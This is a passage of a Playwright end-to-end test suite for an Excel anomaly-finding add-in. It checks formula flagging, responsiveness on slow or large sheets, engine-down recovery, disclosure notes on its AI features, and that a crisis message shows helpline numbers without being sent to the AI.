  ok((await listBits()) === "list-hint,flagged-list,clear-highlights,list-title", "the next scan that flags rows shows the list again - " + (await listBits()));

  // 8b2) AH-152: the scan sends each cell's formula, so a Total typed over its column's formula (D31: the right number
  // today, wrong the day Qty changes) and one row off (D21 =B21*C22) are listed, and neither card says "fix the cells it uses"
  ok(scans.every((b) => b.formulas === null), "a sheet with no formulas sends formulas: null, the scan of before");
  { const calc = [["Item", "Qty", "Price", "Total"], ...Array.from({ length: 40 }, (_, k) => [`Item ${k}`, 2 + (k % 7), 5 + (k % 4), (2 + (k % 7)) * (5 + (k % 4))])];
    calc[20][3] = calc[20][1] * calc[21][2];
    calc[30][3] = 250; // typed over: the card must offer the column's formula, never the worked-out Qty x Price
    await page.evaluate((calc) => { __load("Calc", calc); for (let n = 2; n <= 41; n++) if (n !== 31) __formula("Calc", `D${n}`, n === 21 ? "=B21*C22" : `=B${n}*C${n}`); }, calc);
    await find();
    const sent = scans.at(-1).formulas;
    ok(sent?.length === 40 && sent[0].join() === ",,,=RC[-2]*RC[-1]" && sent[29][3] === null && sent[19][3] === "=RC[-2]*R[1]C[-1]",
      "the scan sends each cell's R1C1 formula, null where none - " + JSON.stringify([sent?.[0], sent?.[19], sent?.[29]]));
    const listed = await text("#flagged-list");
    ok(listed.includes("Row 31") && listed.includes("Row 21") && listed.includes("Total 250 is a typed number where the column's other rows use a formula"),
      "a typed Total among formulas and a formula one row off are both listed - " + listed.slice(0, 300));
    const fills = await page.evaluate(() => ["D31", "A31", "B31", "C31"].map((a) => __cell("Calc", a).fill));
    ok(fills[0] && !fills[1], "the typed Total's cell is coloured, the row's label not - " + fills);
    for (const r of [31, 21]) {
      await openRow(r);
      const said = await text("#fix-explanation"), offer = await text("#fix-changes");
      ok(!said.includes("Fix the cells it uses") && /Accept puts the column's (?:own )?formula/.test(said) && offer === `D${r}: ${r === 31 ? 250 : "=B21*C22"} → =B${r}*C${r}`,
        `row ${r}'s card offers the column's own formula - ${offer} / ${said}`);
      if (r === 31) { // Accept writes the formula into that one cell, by its R1C1 text; Undo types the 250 back
        const w = await page.evaluate(() => __log.length);
        await page.click("#fix-apply"); await idle();
        const wrote = await page.evaluate((n) => __log.slice(n).map((x) => `${x[2]}=${x[3]}`).join(), w), d31 = await page.evaluate(() => __cell("Calc", "D31"));
        ok(wrote === "D31==B31*C31" && d31.f === "=B31*C31", `Accept writes the column's formula into D31 only - wrote ${wrote}, D31 ${JSON.stringify(d31)}`);
        await page.click("#fix-undo"); await idle();
        const back = await page.evaluate(() => __cell("Calc", "D31"));
        ok(back.v === 250 && back.f === null, "Undo puts the typed 250 back - " + JSON.stringify(back));
      }
      await page.click("#fix-back"); await idle();
    }
    await page.click("#clear-highlights"); await idle();
    await page.evaluate(() => __activate("Sales")); await find(); }

  // 8c) AH-124: a double-click on Find problems, and two clicks on Accept faster than the pane can redraw, each do the
  // work once: one /scan, one cell written and one /check. A sheet of its own, so no decision from above is in the way
  await page.evaluate((rows) => __load("Twice", rows, [0]), rows);
  { const k = calls.length;
    await page.dblclick("#scan"); await idle(); await page.waitForTimeout(800); // room for a second /scan to show up
    ok(since(k) === "/scan", "a double-click on Find problems sends one /scan - " + since(k));
    await openRow(11);
    const w = await page.evaluate(() => __log.length), k2 = calls.length;
    await page.evaluate(() => { const b = document.getElementById("fix-apply"); b.click(); b.click(); }); // both before any redraw
    await idle(); await page.waitForTimeout(500);
    const wrote = await page.evaluate((n) => __log.slice(n).map((x) => `${x[1]}!${x[2]}`).join(), w);
    ok(wrote === "Twice!C11" && since(k2) === "/check", `two fast clicks on Accept write one cell and check it once - wrote ${wrote}, sent ${since(k2)}`);
    await page.click("#fix-undo"); await idle(); await back(); }

  // 8d) AH-124: a sheet with over 5,000 rows flagged (a block of 5,200 orders pasted twice) lists the 50 surest and one
  // "+ N more" line, N the rest of what the engine flagged, and the pane never freezes: no task on the page over 2 s
  { const big = [rows[0]];
    for (let i = 0; i < 5200; i++) { const u = 40 + ((i * 7) % 23), c = +(1.99 + (i % 4) + (i % 97) / 100).toFixed(2); big.push([46028 + i, ["East", "West", "Central"][i % 3], u, c, +(u * c).toFixed(2)]); }
    big.push(...big.slice(1).map((r) => [...r]));
    await page.evaluate((big) => __load("Big", big, [0]), big);
    await page.evaluate(() => { window.__longest = 0; new PerformanceObserver((l) => { for (const e of l.getEntries()) __longest = Math.max(__longest, e.duration); }).observe({ type: "longtask" }); });
    const r0 = replies.length;
    await page.click("#scan"); await idle(); await page.waitForSelector("#results", { state: "visible" });
    for (let t = 0; replies.length === r0 && t < 100; t++) await page.waitForTimeout(50);
    const flagged = replies.at(-1).rows.filter((r) => SEV_WORDS[r.severity]).length;
    const list = await page.evaluate(() => ({ buttons: document.querySelectorAll("#flagged-list li[data-i] button").length, more: [...document.querySelectorAll("#flagged-list .more-rows")].map((li) => li.textContent) })); // rows (AH-228: the more line has its own button)
    const longest = await page.evaluate(() => __longest);
    ok(flagged >= 5000 && list.buttons === 50 && list.more.length === 1 && list.more[0].startsWith(`+ ${(flagged - 50).toLocaleString("en-US")} more,`),
      `${flagged} rows flagged: 50 listed and one "+ N more" line with the rest - ${JSON.stringify(list)}`);
    ok(longest < 2000, `the pane stays responsive on ${flagged} flags: its longest task ${Math.round(longest)} ms`);
    await page.click("#clear-highlights"); await idle();
    await page.evaluate(() => __activate("Sales")); await find(); }

  // 8e) AH-149, with an Excel that takes 300 ms a call (a big workbook): the pane answers a press in the same frame and
  // never claims more than the sheet holds. Accept says "Writing to your sheet…" on its own card at once, only the card's
  // buttons go off; Dismiss marks the row and turns the next card in at once; a Dismiss Excel refuses is put back
  { const pressed = (sel, check) => page.evaluate(([sel, check]) => new Promise((done) => {
      const seen = { writing: () => document.getElementById("fix-status").textContent === "Writing to your sheet…" && document.getElementById("fix-apply").disabled,
        dismissed: () => !document.getElementById("fix-title").textContent.startsWith("Row 22:") && __state.decided[20] === "dismissed",
        undoing: () => document.getElementById("fix-status").textContent === "Putting the old values back…" && document.getElementById("fix-undo").disabled }[check];
      let t0 = 0;
      document.addEventListener("click", () => (t0 = performance.now()), { capture: true, once: true });
      const f = () => (t0 && seen() ? done(performance.now() - t0) : t0 && performance.now() - t0 > 3000 ? done(Infinity) : requestAnimationFrame(f));
      requestAnimationFrame(f);
      document.querySelector(sel).click();
    }), [sel, check]);
    // the card's buttons stay where they are drawn when its fix arrives late
    await page.evaluate(() => (window.__slow = 300));
    await page.evaluate(() => { window.__btn = []; const f = () => { const b = document.getElementById("fix-dismiss"); if (b.checkVisibility() && document.getElementById("fix-view").checkVisibility()) __btn.push(b.offsetTop); if (!window.__btnStop) requestAnimationFrame(f); }; window.__btnStop = false; requestAnimationFrame(f); });
    // AH-157: while the row opens, its fix area shows still bars, never an empty box, and they go when the fix lands
    await page.evaluate(() => { window.__fsk = []; const f = () => { if (document.getElementById("fix-view").checkVisibility()) __fsk.push(!!document.querySelector("#fix-view .fix-sk")?.checkVisibility()); if (!window.__btnStop) requestAnimationFrame(f); }; requestAnimationFrame(f); });
    await page.click('#flagged-list button:has-text("Row 22 ")');
    await page.waitForFunction(() => document.querySelector("#fix-view .fix-sk")?.checkVisibility(), null, { timeout: 3000 }).catch(() => {});
    // its picture with the card's turn and the row's morph played to their end (only when pictures are asked for)
    if (process.env.SHOTS) await page.evaluate(() => document.getAnimations().filter((a) => a.effect?.target?.id === "fix-view" || String(a.effect?.pseudoElement).startsWith("::view-transition")).forEach((a) => a.finish()));
    await shot("fix-skeleton");
    await idle();
    await page.waitForFunction(() => document.getElementById("fix-changes").children.length || document.getElementById("fix-explanation").textContent);
    await page.waitForTimeout(300);
    const at = await page.evaluate(() => { window.__btnStop = true; return __btn; });
    { const fsk = await page.evaluate(() => __fsk), anim = await page.evaluate(() => { const e = document.querySelector("#fix-view .fix-sk"); return e && getComputedStyle(e, "::after").animationIterationCount; });
      ok(fsk[0] === true && fsk.at(-1) === false && /^\d+$/.test(anim), `AH-157: a row's card shows still bars while it opens, gone once its fix is in, its light passing a set number of times - first ${fsk[0]}, last ${fsk.at(-1)}, ${anim}`); }
    ok(at.length > 10 && Math.max(...at) === Math.min(...at), `AH-149: the card's buttons stay where they are when its fix arrives ${300 * 2} ms late - ${at.length} frames, ${Math.min(...at)} to ${Math.max(...at)} px`);
    const w0 = await page.evaluate(() => __log.length);
    const ms = await pressed("#fix-apply", "writing");
    const others = await page.evaluate(() => ({ scan: document.getElementById("scan").disabled, faded: [...document.querySelectorAll("#main-ui button")].filter((b) => b.checkVisibility() && getComputedStyle(b).opacity !== "1").map((b) => b.id || b.textContent) }));
    ok(ms < 100 && !others.scan && !others.faded.length, `AH-149: Accept says "Writing to your sheet…" on its card in ${Math.round(ms)} ms, only the card's buttons off, nothing faded - ` + JSON.stringify(others));
    await idle();
    ok((await page.evaluate((n) => __log.length - n, w0)) === 1 && (await text("#fix-status")).startsWith("Accepted"), "and once Excel has it, the card says what the sheet holds - " + (await text("#fix-status")));
    const ums = await pressed("#fix-undo", "undoing");
    ok(ums < 100, `AH-157: Undo says "Putting the old values back…" on its card in ${Math.round(ums)} ms, before Excel has answered`);
    await idle();
    ok((await text("#fix-status")).startsWith("Undone."), "and once Excel has them, the card says they are back - " + (await text("#fix-status")));
    const k0 = await page.evaluate(() => Object.values(__settings.anomalyHunterDecisions?.Sales || {}).length);
    const title0 = await text("#fix-title");
    const dms = await pressed("#fix-dismiss", "dismissed");
    ok(dms < 100, `AH-149: Dismiss marks row 22 Dismissed and turns the next card in, in ${Math.round(dms)} ms, before Excel has answered - ${title0} -> ${await text("#fix-title")}`);
    await idle();
    ok((await page.evaluate(() => Object.values(__settings.anomalyHunterDecisions?.Sales || {}).length)) === k0 + 1 && (await cell("C22")).fill === null,
      "and Excel then takes row 22's highlight off, the Dismiss kept once");
    // a double-click on Dismiss, Excel slow: one row dismissed, one card on
    const t1 = await text("#fix-title");
    await doubleClick("#fix-dismiss"); await idle(); await page.waitForTimeout(400); await idle();
    ok((await page.evaluate(() => Object.values(__settings.anomalyHunterDecisions?.Sales || {}).length)) === k0 + 2 && (await text("#fix-title")) !== t1,
      `AH-149: a double-click on Dismiss with Excel slow dismisses one row - ${t1} -> ${await text("#fix-title")}`);
    // Excel refuses (a cell being typed in): the row and its card come back, said in plain words, nothing kept
    await page.evaluate(() => (window.__slow = 0));
    const t2 = await text("#fix-title"), r2 = +/^Row (\d+)/.exec(t2)[1], k2 = await page.evaluate(() => Object.values(__settings.anomalyHunterDecisions?.Sales || {}).length);
    await failing(/InvalidOperationInCellEditMode/, async () => { await page.evaluate(() => (window.__cellEdit = 1)); await page.click("#fix-dismiss"); await idle(); });
    const putBack = { title: await text("#fix-title"), status: await text("#fix-status"), kept: await page.evaluate(() => Object.values(__settings.anomalyHunterDecisions?.Sales || {}).length),
      decided: await page.evaluate((i) => __state.decided[i] ?? null, r2 - 2) };
    ok(putBack.title === t2 && putBack.status === `Row ${r2} was not dismissed, so it is back on your list. Excel is busy editing a cell. Press Enter or Esc, then try again.` && putBack.kept === k2 && putBack.decided === null,
      "AH-149: a Dismiss Excel refuses puts the row and its card back and says so in plain words - " + JSON.stringify(putBack));
    await back();
    // step 2 of a scan that takes a while counts its seconds, never a made-up percentage
    await page.route("**/scan", async (r) => { await new Promise((go) => setTimeout(go, 2300)); await r.continue(); }, { times: 1 });
    await page.click("#scan");
    // its words, beside the line's Stop (AH-228 P-28)
    const secs = await page.waitForFunction(() => /^Step 2 of 3: checking 300 rows… 2 s$/.test(document.querySelector("#busy-line > span").textContent), null, { timeout: 8000 }).then(() => true, () => false);
    await idle();
    ok(secs, "AH-149: while the engine checks, the progress line counts the seconds it has taken"); }

  // 9) the engine down when the pane opens: the pane says so, and Try again brings it back once it answers.
  // Every /health is refused until the pane has said so, not only the first: with { times: 1 } any other request for
  // /health that reached the route before the pane's own (CI's Edge, PR #72) took the one refusal, the pane's call got
  // the real engine and opened as usual, and the wait for #server-down ran out at 30 s (AH-69). Then the route goes, and
  // Try again meets the engine
  let refused = 0;
  const down = (r) => (refused++, r.abort("connectionrefused"));
  const waiting = [], hold = (r) => { waiting.push(r); };
  await failing(DROPPED, async () => {
    await page.route("**/health", down);
    await page.reload(); await page.waitForSelector("#server-down", { state: "visible" }).catch(() => {});
    const opened = await page.evaluate(() => ["app-body", "main-ui", "server-down"].map((id) => `${id} ${document.getElementById(id).hidden ? "hidden" : "shown"}`).join(", "));
    ok(refused >= 1 && (await page.isVisible("#server-down")) && (await text("#server-down")).replace(/\s+/g, " ").trim() === DOWN_AT_START + " Try again" && !(await page.isVisible("#main-ui")),
      `the engine down at start: said in plain words - ${refused} /health refused; ${opened}`);
    // AH-157: Try again shows the start-up skeleton at once while it asks (nothing changed for up to 10 s), and a refusal
    // brings the words back
    await page.unroute("**/health", down); await page.route("**/health", hold);
    await page.click("#retry-health");
    const asking = await page.evaluate(() => ({ skeleton: document.getElementById("skeleton").checkVisibility(), down: document.getElementById("server-down").checkVisibility() }));
    for (let t = 0; !waiting.length && t < 50; t++) await page.waitForTimeout(100);
    await shot("health-retry");
    ok(asking.skeleton && !asking.down && waiting.length === 1, "AH-157: Try again shows the start-up skeleton in the frame of the press while it asks - " + JSON.stringify({ ...asking, asked: waiting.length }));
    for (const r of waiting.splice(0)) await r.abort("connectionrefused");
    await page.waitForSelector("#server-down", { state: "visible", timeout: 5000 }).catch(() => {});
    await page.unroute("**/health", hold);
  });
  // AH-157: while Arcas has stopped the pane asks again on its own every 5 s, and opens once the engine answers, with no press
  const t9a = Date.now();
  await page.waitForSelector("#main-ui", { state: "visible", timeout: 9000 }).catch(() => {});
  ok(await page.isVisible("#main-ui") && Date.now() - t9a < 8000, `AH-157: the pane opens by itself once the engine answers again, in ${Date.now() - t9a} ms`);
  // 9b) an engine that takes the call and never answers (hung, or another program on port 5055): the start-up check gave
  // up never, and the pane stayed on its skeleton for good (AH-87). It gives up after 10 s and says the checker isn't running
  let hung = 0;
  const hang = () => { hung++; }; // never fulfilled, never aborted
  await page.route("**/health", hang);
  const t9 = Date.now();
  await page.reload();
  const said = await page.waitForSelector("#server-down", { state: "visible", timeout: 20000 }).then(() => true, () => false);
  const waited = Date.now() - t9;
  await page.unroute("**/health", hang);
  ok(hung >= 1 && said && waited >= 9000 && waited < 20000 && !(await page.isVisible("#main-ui")),
    `an engine that never answers /health: after ${waited} ms the pane says Arcas has stopped (${hung} /health held)`);
  await page.focus("#retry-health"); await page.keyboard.press("Enter"); await page.waitForSelector("#main-ui", { state: "visible", timeout: 10000 }).catch(() => {});
  ok(await page.isVisible("#main-ui"), "and Try again opens the pane once the engine answers");
  ok((await page.evaluate(() => document.activeElement.id)) === "scan", "AH-170: and focus goes from Try again, now hidden, to Find problems - " + (await page.evaluate(() => document.activeElement.id || document.activeElement.tagName)));
  // AH-180: a student copied three series onto three tabs and pasted series 2 again on the third, under its own header
  { const wave = (k) => Array.from({ length: 40 }, (_, i) => Math.round(100 * Math.sin(i * 1.3 + k)) / 10 + 50);
    const series = (k, head) => [["Time (s)", head], ...wave(k).map((v, i) => [i, v])];
    await page.evaluate(([a, b, c]) => { __load("Series 1", a); __load("Series 2", b); __load("Series 3", c); }, [series(1, "Signal"), series(2, "Signal"), series(2, "Response")]);
    await find();
    ok((await text("#book-notes")).startsWith('"Series 3" holds the same 40 numbers as "Series 2", in the same order. If you meant to paste a different series there, the same one went in twice.'),
      "AH-180: Find problems says, first under its results, the tab that holds another tab's numbers - " + (await text("#book-notes"))); }
}

// AH-164: a note under an AI button is one short line at most; what it sends is a press away under "What is sent?" /
// "What Ask AI sends", closed until asked, and opened says it all (John read four lines of small print under each button)
const shortNote = async (box, note, summary, full) => {
  const m = await page.evaluate(([box, note]) => { const d = document.querySelector(box).querySelector("details");
    const lines = [...document.querySelectorAll(note)].filter((p) => p.checkVisibility()).reduce((n, p) => { const r = document.createRange(); r.selectNodeContents(p);
      return n + new Set([...r.getClientRects()].map((k) => Math.round(k.top))).size; }, 0);
    return { lines, open: d?.open, summary: d?.querySelector("summary")?.textContent }; }, [box, note]);
  let said = ""; // null-safe: a note with no box to open fails by name
  if (m.summary) { await page.click(`${box} summary`);
    said = await page.evaluate((box) => [...document.querySelectorAll(`${box} details p`)].filter((p) => p.checkVisibility()).map((p) => p.textContent).join(" "), box);
    await page.click(`${box} summary`); }
  ok(m.lines <= 1 && m.open === false && m.summary === summary && full.every((f) => said.includes(f)),
    `AH-164: under ${box}'s button at most one line shows; "${summary}", closed, opens to all it sends - ` + JSON.stringify({ ...m, said }));
};

if (mode === "ai") { // engine started with no key: the free AI through stub_ai.py (e2e/engine.py)
  await find();
  ok(await page.isVisible("#ai-fold") || !(await page.isVisible("#ai-off")), "AI help is on (the free AI, no key)");
  // AH-228 P-18 (AH-164's and AH-202's boxes, now folded): Check words and Check subject rules wait under one closed line,
  // "More checks with AI", under the list; Remove highlights stays outside it
  { const m = await page.evaluate(() => { const d = document.getElementById("ai-checks"), sum = d?.querySelector("summary");
      return { shown: !!d?.checkVisibility(), open: d?.open, summary: sum?.textContent, tall: sum?.getBoundingClientRect().height, words: document.getElementById("odd-check").checkVisibility(),
        clear: !d?.contains(document.getElementById("clear-highlights")) && document.getElementById("clear-highlights").checkVisibility() }; });
    ok(m.shown && m.open === false && m.summary === "More checks with AI" && m.tall >= 44 && !m.words && m.clear, "AH-228 P-18: the AI checks fold under one closed line, 44 px tall, Remove highlights outside it - " + JSON.stringify(m)); }
  await page.click("#ai-checks > summary");
  await shortNote("#odd-box", "#odd-box p", "What is sent?", ["It sends only the different words in your text columns to Google (through John's relay if you use an invite code), never your rows or numbers.", "Its answers are leads to check."]);
  await shortNote("#rules-box", "#rules-box p", "What is sent?", ["It sends only the first 200 column headers, each cut to 100 characters, and whether each column holds numbers, dates, text or IDs", "never a cell.", "Arcas checks each rule on every row on this PC."]);
  // AH-175: Ask AI is folded under a card's fix, "Want a different fix? Ask AI", and open by itself on a card with no fix
  { const look = () => page.evaluate(() => ({ title: document.getElementById("fix-title").textContent, fix: document.getElementById("fix-changes").children.length,
      open: document.getElementById("ai-fold").open, summary: document.querySelector("#ai-fold > summary").textContent, box: document.getElementById("fix-intent").checkVisibility(),
      label: document.getElementById("fix-intent-label").textContent, kind: document.getElementById("fix-label").textContent,
      starter: !document.querySelector("#fix-tries .try:nth-child(2)").hidden }));
    const cards = [];
    for (const r of [11, 51, 121]) { await openRow(r); cards.push(await look()); await back(); }
    ok(cards.every((c) => c.summary === (c.fix ? "Want a different fix? Ask AI" : "Ask AI for a fix") && c.open === !c.fix && c.box === !c.fix
      && c.label === (c.fix ? "For a different fix, describe it and AI will draft one." : "Describe the fix you want and AI will draft one.")) && cards.some((c) => c.fix) && cards.some((c) => !c.fix),
      "AH-175, AH-228 P-33: Ask AI folded on a card with a fix, open on one with none and said as the way to a fix - " + JSON.stringify(cards));
    // AH-235: "What should this value be?" is the way to a fix, so a card the engine already fixed for sure does not show it
    ok(cards.every((c) => c.starter === (!c.fix || c.kind.startsWith("Best guess"))) && cards.some((c) => c.fix && !c.starter) && cards.some((c) => !c.fix && c.starter),
      "AH-235: the value starter is hidden on a card with a sure engine fix and shown on one with none - " + JSON.stringify(cards)); }
  await openRow(11);
  ok(await page.isVisible("#ai-fold") && !(await page.isVisible("#ai-off")), "Ask AI shown with the free AI on");
  await page.click("#ai-fold > summary");
  await shortNote("#ai-box", "#fix-sends", "What Ask AI sends", ["Ask AI sends the column names, this row and up to 5 rows above and below it", "Up to 5 fixes you accepted before in a column with this name"]);
  // typed with the real keyboard: page.fill sets the value without a single key event, and so hid that the box
  // cancelled every key (2026-10-20). Keys inside a text field never start a scan, and Ctrl+Enter asks AI, which sends
  // only /fix and /check. Focus once left on the slider or Find problems (both act on a key) before the box was clicked;
  // since AH-165 they step aside while a card is open, so no focus or key can reach them at all
  const posts = []; // every POST the page makes, by path
  page.on("request", (r) => r.method() === "POST" && posts.push(new URL(r.url()).pathname));
  const level = await page.getAttribute("#strength", "aria-valuenow");
  const reach = await page.evaluate(() => ["strength", "scan"].filter((id) => { const e = document.getElementById(id); e.focus(); return document.activeElement === e || e.checkVisibility(); }));
  ok(reach.length === 0, "AH-165: with a card open, the slider and Find problems are out of the way: neither shows or takes focus - " + reach);
  await page.click("#fix-intent");
  await page.keyboard.type("use the average Units");
  await page.keyboard.press("Enter");
  await page.keyboard.type("for East");
  // a space then Backspace leave the text as it was, wherever the caret ended up
  for (const k of ["ArrowLeft", "ArrowRight", "ArrowUp", "ArrowDown", "Home", "End", "PageUp", "PageDown", " ", "Backspace"]) await page.keyboard.press(k);
  await page.click("#fix-intent");
  for (const k of ["End", " ", "Backspace", "Enter", "Backspace"]) await page.keyboard.press(k);
  await page.waitForTimeout(500); // a scan would have started by now
  const typed = "use the average Units\nfor East";
  ok((await page.inputValue("#fix-intent")) === typed, "typed keys land in the Ask AI box, Enter makes a new line - " + JSON.stringify(await page.inputValue("#fix-intent")));
  ok(posts.length === 0 && (await page.getAttribute("#strength", "aria-valuenow")) === level, "typing, Enter, Space and arrows in the box start no scan - " + posts);
  // fast typing (no delay between keys), with Enter and Backspace in it: still nothing is sent, the text is exactly
  // what was typed. The box has no handler on typing at all (only Ctrl+Enter), so there is nothing to debounce.
  await page.fill("#fix-intent", ""); await page.click("#fix-intent");
  const fast = "Use the median Units of the East rows, not the mean; keep the Total formula as it is. ".repeat(4);
  await page.keyboard.type(fast, { delay: 0 });
  await page.keyboard.press("Enter"); await page.keyboard.type("and say why", { delay: 0 });
  for (let k = 0; k < 4; k++) await page.keyboard.press("Backspace");
  await page.waitForTimeout(1000); // an AI call started by typing would be on its way by now
  ok((await page.inputValue("#fix-intent")) === fast + "\nand say" && posts.length === 0, "fast typing with Enter and Backspace: the text stays exactly as typed and no AI call starts - " + posts);
  await page.fill("#fix-intent", ""); await page.click("#fix-intent");
  await page.keyboard.type("use the average Units"); await page.keyboard.press("Enter"); await page.keyboard.type("for East");
  ok((await page.inputValue("#fix-intent")) === typed, "back to the request this test asks with - " + JSON.stringify(await page.inputValue("#fix-intent")));
  await page.keyboard.press("Control+Enter");
  await page.waitForFunction(() => document.getElementById("fix-label").textContent === "AI's fix", null, { timeout: 30000 });
  ok(posts.includes("/fix") && posts.every((p) => p === "/fix" || p === "/check"), "Ctrl+Enter asks AI: only /fix and /check are sent - " + posts);
  ok((await page.inputValue("#fix-intent")) === typed, "Ctrl+Enter adds no new line");
  const asked = fs.readFileSync(DIR + "ai.log", "utf8").trim().split("\n").map(JSON.parse).filter((l) => l.prompt.includes("Flagged row")).at(-1);
  ok(asked && asked.prompt.includes(`User's request: ${typed}`), "what was typed is what AI is asked");
  ok((await text("#fix-changes")).startsWith("C11: -5 → =AVERAGEIFS("), "AI's fix previewed - " + (await text("#fix-changes")));
  ok((await cell("C11")).v === -5, "nothing written before Accept");
  await page.click("#fix-apply"); await idle();
  ok(String((await cell("C11")).f).startsWith("=AVERAGEIFS("), "Accept writes the AI formula");
  await page.click("#fix-undo"); await idle();
  ok((await cell("C11")).v === -5 && !String((await cell("C11")).f ?? "").startsWith("="), "Undo takes the AI formula back out - " + (await text("#fix-status")));
  posts.length = 0;
  await page.click("#fix-ask");
  await page.waitForFunction(() => document.getElementById("fix-ask").textContent === "Ask AI" && !document.getElementById("fix-ask").disabled, null, { timeout: 30000 });
  ok(posts.includes("/fix") && posts.every((p) => p === "/fix" || p === "/check"), "clicking Ask AI sends only /fix and /check, never /scan - " + posts);
  // AH-124: two clicks on Ask AI faster than the pane can redraw send one /fix (each would be a call to Google, and
  // through the relay one of the invite's daily fixes)
  posts.length = 0;
  await page.evaluate(() => { const b = document.getElementById("fix-ask"); b.click(); b.click(); });
  await page.waitForFunction(() => document.getElementById("fix-ask").textContent === "Ask AI" && !document.getElementById("fix-ask").disabled, null, { timeout: 30000 });
  await page.waitForTimeout(500); // room for a second /fix to show up
  ok(posts.filter((p) => p === "/fix").length === 1, "two fast clicks on Ask AI send one /fix - " + posts);
  // AH-125: words of someone in crisis get helpline numbers from the engine itself. Typed with the real keyboard, like
  // the request above; nothing reaches the AI stand-in, no fix and no Accept are offered beside it
  const asks = () => fs.readFileSync(DIR + "ai.log", "utf8").trim().split("\n").length;
  const asked0 = asks();
  posts.length = 0;
  await page.fill("#fix-intent", ""); await page.click("#fix-intent");
  await page.keyboard.type("I don’t want to live anymore");
  await page.click("#fix-ask");
  await page.waitForSelector("#fix-care", { state: "visible", timeout: 30000 }).catch(() => {});
  await page.waitForFunction(() => document.getElementById("fix-ask").textContent === "Ask AI" && !document.getElementById("fix-ask").disabled, null, { timeout: 30000 });
  await page.waitForTimeout(500); // room for a /check or a late AI call to show up
  const careSaid = await page.isVisible("#fix-care") ? await text("#fix-care") : "";
  ok(careSaid.includes("988") && careSaid.includes("findahelpline.com") && careSaid.includes("was not sent to the AI"),
    "words of someone in crisis: the pane shows helpline numbers - " + JSON.stringify(careSaid));
  ok(posts.join() === "/fix" && asks() === asked0, `and nothing reaches the AI: ${posts}; ${asks() - asked0} new AI calls`);
  ok(!(await page.isVisible("#fix-apply")) && (await page.$eval("#fix-care", (p) => p.children.length)) === 0,
    "no Accept beside it, and the message is plain text");
  ok(!(await page.isVisible("#fix-label")) && (await page.$eval("#fix-changes", (u) => u.children.length)) === 0 && (await text("#fix-explanation")) === "",
    "and no earlier suggestion beside it");
  await contrast("a row's card with the helpline message");
  { await page.$eval("#ai-fold", (d) => (d.open = false)); // AH-175: the helpline message is never folded away with Ask AI
    const still = await page.isVisible("#fix-care") && (await text("#fix-care")) === careSaid;
    await page.$eval("#ai-fold", (d) => (d.open = true));
    ok(still, "AH-175: with Ask AI folded, the helpline message still shows"); }
  // the next ask clears it, and a real fix brings Accept back
  await page.fill("#fix-intent", ""); await page.click("#fix-intent");
  await page.keyboard.type("use the average Units"); await page.keyboard.press("Enter"); await page.keyboard.type("for East");
  await page.click("#fix-ask");
  await page.waitForFunction(() => document.getElementById("fix-ask").textContent === "Ask AI" && !document.getElementById("fix-ask").disabled, null, { timeout: 30000 });
  ok(!(await page.isVisible("#fix-care")) && (await page.isVisible("#fix-apply")), "the next ask clears the helpline message and offers Accept again");
  // AH-150: a backup model answered (the engine adds `model` only then): the notice names it, as plain text
  const BACKUP = "gemini-3.5-flash-lite";
  await page.route("**/fix", async (r) => {
    const res = await r.fetch();
    await r.fulfill({ status: res.status(), contentType: "application/json", body: JSON.stringify({ ...(await res.json()), model: BACKUP }) });
  }, { times: 1 });
  await page.click("#fix-ask");
  await page.waitForFunction(() => document.getElementById("fix-ask").textContent === "Ask AI" && !document.getElementById("fix-ask").disabled, null, { timeout: 30000 });
  ok((await text("#fix-care")) === `Google's main AI was busy, so the backup model ${BACKUP} answered. Check its change before you accept.`
    && (await page.$eval("#fix-care", (p) => p.children.length)) === 0 && (await page.isVisible("#fix-apply")),
  "a backup model answered: the notice names it, and Accept stays - " + JSON.stringify(await text("#fix-care")));
  // the AI call fails: the engine's own words for a provider error, or the engine gone mid-call. Said on the card, the
  // button comes back, the typed request stays
  for (const [how, fail, words] of [
    ["the provider fails", (r) => r.fulfill({ status: 502, contentType: "application/json", body: JSON.stringify({ error: AI_BROKE }) }), AI_BROKE],
    ["the engine goes down mid-call", dropMidway, DOWN]]) {
    await failing(DROPPED, async () => {
      await page.route("**/fix", fail, { times: 1 }); await page.click("#fix-ask");
      await page.waitForFunction(() => document.getElementById("fix-ask").textContent === "Ask AI" && !document.getElementById("fix-ask").disabled, null, { timeout: 30000 }).catch(() => {});
    });
    ok((await text("#fix-care")) === "AI could not help: " + words && (await page.isVisible("#fix-care")) && (await text("#fix-status")) === "" && !(await page.isDisabled("#fix-ask")) && (await page.inputValue("#fix-intent")) === typed,
      `Ask AI when ${how}: said on the card in its notice box, Ask AI back, the request kept - ` + (await text("#fix-care")) + " | " + (await text("#fix-status")));
    const look = await looksLikeNotice("#fix-care");
    ok(look.ok, `AH-149 review r2: Ask AI when ${how}: why it could not help is a notice at body size, said once - ` + JSON.stringify(look));
  }

  // AH-149: three requests to start from, each one Ask AI already answers: a press fills the box and sends nothing
  { posts.length = 0;
    const tries = await page.$$eval("#fix-tries .try", (bs) => bs.map((b) => b.textContent));
    await page.click('#fix-tries .try:has-text("Is this a typo?")'); await page.waitForTimeout(400);
    ok(tries.join("|") === "Explain this row in simple words|What should this value be?|Is this a typo?" && (await page.inputValue("#fix-intent")) === "Is this a typo?"
      && posts.length === 0 && (await page.evaluate(() => document.activeElement.id)) === "fix-intent", "a request to start from fills the Ask AI box, sends nothing and leaves the caret in the box - " + posts);
    await page.fill("#fix-intent", typed); }

  // the AI key box (Options > AI help > Use your own Google key, AH-228 P-10) takes typed keys too; Enter in it sends nothing
  await page.click("#settings summary");
  await page.click("#own-key summary");
  posts.length = 0;
  await page.click("#ai-key");
  await page.keyboard.type("AIzaTypedKey_123");
  await page.keyboard.press("Enter");
  await page.waitForTimeout(300);
  ok((await page.inputValue("#ai-key")) === "AIzaTypedKey_123" && posts.length === 0, "the AI key box takes typed keys; Enter there sends nothing - " + posts);
  await page.fill("#ai-key", "");
  await page.click("#own-key summary");
  await page.click("#settings summary");

  // Check words with AI: only the text columns' distinct words go; the AI's answer is shown as text, never as markup,
  // and a word it makes up (not in the column) is dropped. The stub answers with markup in "why" and a made-up word.
  await back();
  // AH-157: Check words says it is asking, and counts its seconds, while the AI reads (the pane sat silent, every button
  // off, for up to 300 s)
  await page.route("**/odd-text", async (r) => { await new Promise((go) => setTimeout(go, 1600)); await r.continue(); }, { times: 1 });
  await page.click("#odd-check");
  const asking = await page.evaluate(() => ({ shown: document.getElementById("busy").checkVisibility(), said: document.getElementById("busy-text").textContent }));
